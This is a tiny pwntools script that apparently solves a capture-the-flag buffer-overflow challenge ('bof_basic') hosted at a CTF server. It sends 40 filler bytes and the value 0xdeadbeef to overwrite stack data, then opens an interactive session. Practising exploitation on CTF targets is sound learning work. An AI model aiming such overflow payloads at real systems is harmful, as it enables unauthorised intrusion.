from pwn import *

e = ELF("./bof_basic")
#p = process("./bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3000)

payload = ''
payload += "A"*40
payload += p32(0xdeadbeef)

r.sendline(payload)
r.interactive()
